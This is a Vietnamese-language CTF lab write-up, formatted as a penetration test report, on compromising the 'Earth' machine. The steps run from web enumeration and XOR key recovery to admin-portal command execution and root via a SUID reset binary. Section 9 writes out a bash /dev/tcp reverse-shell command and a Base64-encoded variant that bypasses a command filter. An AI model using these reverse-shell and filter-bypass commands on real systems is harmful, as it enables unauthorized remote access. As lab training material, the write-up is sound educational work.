# SECURITY ASSESSMENT REPORT – The Planets: Earth

## 1. Tổng quan

### 1.1. Thông tin mục tiêu

| Thông tin       | Giá trị                                             |
| --------------- | --------------------------------------------------- |
| Target          | `192.168.196.129`                                   |
| Domain          | `earth.local`                                       |
| Subdomain       | `terratest.earth.local`                             |
| Assessment Type | Black-box Penetration Testing                       |
| Objective       | Gain initial access and escalate privileges to root |

### 1.2. Tóm tắt

Quá trình kiểm thử bắt đầu bằng reconnaissance và enumeration trên mục tiêu. Kết quả cho thấy hệ thống cung cấp các dịch vụ SSH, HTTP và HTTPS.

Trong quá trình kiểm tra web application, thông tin nhạy cảm được phát hiện thông qua `robots.txt` và file `testingnotes.txt`. Các thông tin này dẫn đến việc phát hiện cơ chế mã hóa XOR và username của admin portal.

Sau khi phân tích dữ liệu được mã hóa và xác định được key, có thể đăng nhập vào admin portal và khai thác chức năng command execution để đạt được quyền thực thi lệnh dưới tài khoản `apache`.

Tiếp theo, quá trình enumeration local system phát hiện một SUID binary có tên `reset_root`. Phân tích reverse engineering cho thấy binary chứa cơ chế reset mật khẩu root dựa trên sự tồn tại của ba file đặc biệt. Việc tạo các file này và thực thi binary cho phép thay đổi mật khẩu root, từ đó đạt được quyền root trên hệ thống.

---

# 2. Reconnaissance

## 2.1. Port Scanning

Thực hiện quét toàn bộ TCP port:

```bash
nmap -p- -sC -sV 192.168.196.129
```

Kết quả xác định ba dịch vụ đang hoạt động:

* `22/tcp` – SSH
* `80/tcp` – HTTP
* `443/tcp` – HTTPS

![Nmap Scan](img/nmap.png?raw=true)

**Hình 1.** Kết quả quét Nmap trên target.

---

## 2.2. Virtual Host Enumeration

Trong quá trình kiểm tra HTTP service, phát hiện các domain:

* `earth.local`
* `terratest.earth.local`

Các domain được thêm vào `/etc/hosts` để phục vụ quá trình kiểm thử.

Truy cập `terratest.earth.local` cho thấy trang web chỉ chứa nội dung:

```text
Test site, please ignore.
```

![Terra Test](img/port%2080.png?raw=true)

**Hình 2.** Nội dung của `terratest.earth.local`.

---

# 3. Web Enumeration

## 3.1. Directory Enumeration

Sử dụng Gobuster để tìm các endpoint và resource:

```bash
gobuster dir -u http://earth.local/ \
-w /usr/share/dirb/wordlists/common.txt
```

Kết quả phát hiện endpoint đáng chú ý:

```text
/admin
```

![Gobuster HTTP](img/gobuster80.png?raw=true)

**Hình 3.** Kết quả directory enumeration trên HTTP.

Tiếp tục kiểm tra HTTPS:

```bash
gobuster dir -u https://earth.local/ \
-w /usr/share/dirb/wordlists/common.txt
```

Phát hiện:

```text
/robots.txt
```

![Gobuster HTTPS](img/gobuster443.png?raw=true)

**Hình 4.** Kết quả directory enumeration trên HTTPS.

---

# 4. Information Disclosure

## 4.1. Phân tích robots.txt

Truy cập:

```text
https://earth.local/robots.txt
```

File chứa nhiều rule `Disallow`, trong đó đáng chú ý:

```text
Disallow: /testingnotes.*
```

Điều này cho thấy server có thể chứa resource bắt đầu bằng `testingnotes`.

Sau khi thử các extension khác nhau, resource `testingnotes.txt` được phát hiện.

```
User-Agent: *

Disallow: /*.asp

Disallow: /*.aspx

Disallow: /*.bat

Disallow: /*.c

Disallow: /*.cfm

Disallow: /*.cgi

Disallow: /*.com

Disallow: /*.dll

Disallow: /*.exe

Disallow: /*.htm

Disallow: /*.html

Disallow: /*.inc

Disallow: /*.jhtml

Disallow: /*.jsa

Disallow: /*.json

Disallow: /*.jsp

Disallow: /*.log

Disallow: /*.mdb

Disallow: /*.nsf

Disallow: /*.php

Disallow: /*.phtml

Disallow: /*.pl

Disallow: /*.reg

Disallow: /*.sh

Disallow: /*.shtml

Disallow: /*.sql

Disallow: /*.txt

Disallow: /*.xml

Disallow: /testingnotes.*
```

Truy cập:

```text
https://earth.local/testingnotes.txt
```

thu được:

```text
Testing secure messaging system notes:

*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.

Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```

Thông tin này làm lộ:

* Ứng dụng sử dụng XOR để mã hóa dữ liệu.
* `testdata.txt` được sử dụng để kiểm thử encryption.
* Username của admin portal là `terra`.
* Hệ thống có một admin panel.

Đây là một dạng **Information Disclosure** do các file chứa thông tin nội bộ có thể truy cập trực tiếp từ web server.

---

# 5. Phân tích cơ chế mã hóa

## 5.1. Thu thập dữ liệu

Truy cập `testdata.txt` để thu thập dữ liệu phục vụ quá trình phân tích encryption.

![Test Data](img/cyberchef1.png?raw=true)

**Hình 5.** Dữ liệu được sử dụng trong quá trình phân tích XOR.

Tiếp tục kiểm tra ciphertext trên `earth.local` và sử dụng CyberChef để phân tích.

Trong quá trình thử nghiệm, phát hiện chuỗi:

```text
earthclimatechangebad4humans
```

có khả năng được sử dụng làm XOR key/password.

![CyberChef](img/cyberchef1.png?raw=true)

**Hình 6.** Phân tích ciphertext bằng CyberChef.

Sử dụng key trên để giải mã ciphertext thu được plaintext.

![Decrypted Message](img/cyberchef2.png?raw=true)

**Hình 7.** Kết quả giải mã thành công.

Kết quả cho thấy key có thể được sử dụng để truy cập admin portal.

---

# 6. Compromise Admin Portal

Truy cập:

```text
http://earth.local/admin
```

Sử dụng thông tin:

```text
Username: terra
Password: earthclimatechangebad4humans
```

Đăng nhập thành công.

![Admin Login](img/loginsuccess.png?raw=true)

**Hình 8.** Đăng nhập thành công vào admin portal.

Việc thông tin xác thực có thể được suy ra từ các resource public cho thấy hệ thống có vấn đề về **credential disclosure và credential management**.

---

# 7. Remote Command Execution

Admin panel cung cấp chức năng thực thi command trên server.

Thử thực hiện:

```bash
whoami
```

Kết quả:

```text
apache
```

![Command Execution](img/whoami.png?raw=true)

**Hình 9.** Command được thực thi dưới quyền `apache`.

Điều này cho thấy attacker đã đạt được khả năng **Remote Command Execution (RCE)** trên server.

---

# 8. Obtaining User Flag

Sau khi có command execution, tiến hành tìm user flag:

```bash
find / -name "user_flag.txt" 2>/dev/null
```

![User Flag](img/user_flag.png?raw=true)

**Hình 10.** Tìm thấy user flag trên hệ thống.

User flag được truy cập thành công dưới quyền `apache`.

---

# 9. Reverse Shell

Thử thiết lập reverse shell bằng Bash:

```bash
bash -i >& /dev/tcp/192.168.196.129/1234 0>&1
```

Tuy nhiên command bị chặn với thông báo:

```text
Remote connections are forbidden.
```

![Blocked Reverse Shell](img/bash.png?raw=true)

**Hình 11.** Reverse shell bị chặn bởi command filter.

Để kiểm tra khả năng bypass filter, command được encode bằng Base64:

```bash
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ni4xMjgvMTIzNCAwPiYx" | base64 -d | bash
```

Sau khi decode và thực thi, reverse shell được thiết lập thành công.

![Reverse Shell](img/rce.png?raw=true)

**Hình 12.** Bypass command filter và đạt được reverse shell.

Điều này cho thấy cơ chế command filtering hiện tại chỉ dựa trên việc phát hiện một số chuỗi nguy hiểm và có thể bị bypass thông qua encoding.

---

# 10. Privilege Escalation

Sau khi có shell, tiến hành kiểm tra các file có SUID bit:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Kết quả phát hiện binary:

```text
/usr/bin/reset_root
```

![SUID Enumeration](img/find.png?raw=true)

**Hình 13.** Phát hiện `reset_root` trong danh sách SUID binary.

Binary được tải về và phân tích bằng IDA.

---

# 11. Phân tích binary reset_root

Phân tích binary cho thấy chương trình chứa các chuỗi và dữ liệu được mã hóa.

Một đoạn đáng chú ý:

```c
strcpy(v12, "credentials root:theEarthisflat");
```

Ngoài ra, chương trình sử dụng hàm:

```c
magic_cipher()
```

để giải mã dữ liệu được hardcode trong binary.

---

# 12. Phân tích hàm magic_cipher

Hàm được decompile thành:

```c
__int64 __fastcall magic_cipher(
    __int64 a1,
    __int64 a2,
    __int64 a3,
    signed int a4,
    int a5)
{
  for (i = 0; i < a4; ++i)
    *(_BYTE *)(i + a3) =
        *(_BYTE *)(i + a1) ^
        *(_BYTE *)(i % (a5 - 1) + a2);

  return i;
}
```

Có thể xác định đây là cơ chế XOR:

```text
plaintext[i] = ciphertext[i] XOR key[i % key_length]
```

Chương trình trước tiên giải mã một chuỗi để tạo key, sau đó sử dụng key này để giải mã ba chuỗi tiếp theo.

Ba chuỗi được giải mã chính là các file/path được sử dụng làm **reset trigger**.

---

# 13. Xác định Reset Trigger

Để quan sát hành vi runtime của binary, sử dụng:

```bash
ltrace ./reset_root
```

Kết quả:

```text
access("/dev/shm/kHgTFI5G", 0) = -1
access("/dev/shm/Zw7bV9U5", 0) = -1
access("/tmp/kcM0Wewe", 0) = -1
```

![Ltrace](img/ltrace.png?raw=true)

**Hình 14.** `ltrace` cho thấy ba reset trigger được kiểm tra.

Ba file cần tồn tại là:

```text
/dev/shm/kHgTFI5G
/dev/shm/Zw7bV9U5
/tmp/kcM0Wewe
```

Giá trị trả về `-1` của `access()` cho thấy các file chưa tồn tại.

---

# 14. Root Privilege Escalation

Tạo ba file trigger:

```bash
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe
```

Sau đó thực thi:

```bash
./reset_root
```

Khi cả ba trigger tồn tại, chương trình hiển thị:

```text
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
```

![Root Reset](img/root.png?raw=true)

**Hình 15.** Binary thực hiện reset root password.

Từ source đã reverse engineer, chương trình thực hiện:

```c
setuid(0);
system("/usr/bin/echo 'root:Earth' | /usr/sbin/chpasswd");
```

Do đó, mật khẩu tài khoản `root` được thay đổi thành:

```text
Earth
```

Sau đó đăng nhập với tài khoản root và xác nhận quyền:

```bash
whoami
```

Kết quả:

```text
root
```

Như vậy, quá trình privilege escalation hoàn tất.

---

# 15. Attack Chain

```text
Network Enumeration
        ↓
HTTP/HTTPS Enumeration
        ↓
robots.txt
        ↓
testingnotes.txt
        ↓
Information Disclosure
        ↓
XOR Analysis
        ↓
Recover Credential
        ↓
Admin Portal
        ↓
Command Execution
        ↓
apache shell
        ↓
SUID Enumeration
        ↓
reset_root
        ↓
Reverse Engineering
        ↓
Discover 3 Reset Triggers
        ↓
Create Trigger Files
        ↓
reset_root
        ↓
Root Password Reset
        ↓
ROOT
```

---

# 16. Security Impact

Các vấn đề phát hiện trong quá trình kiểm thử có thể dẫn đến compromise toàn bộ hệ thống:

### Information Disclosure

Các file như `robots.txt` và `testingnotes.txt` làm lộ thông tin nội bộ, username và thông tin liên quan đến cơ chế encryption.

### Weak Credential Management

Thông tin dùng để truy cập admin portal có thể được suy ra từ dữ liệu public và cơ chế XOR yếu.

### Remote Command Execution

Admin panel cho phép thực thi command trực tiếp trên server.

### Insufficient Command Filtering

Cơ chế blacklist command có thể bị bypass thông qua Base64 encoding.

### Dangerous SUID Binary

`reset_root` là SUID binary owned by root và chứa chức năng thay đổi mật khẩu root dựa trên các file trigger có thể được tạo bởi user có quyền thấp.

### Hardcoded Root Password

Root password được hardcode trực tiếp trong binary:

```text
root:Earth
```

Điều này tạo ra nguy cơ compromise toàn bộ hệ thống.

---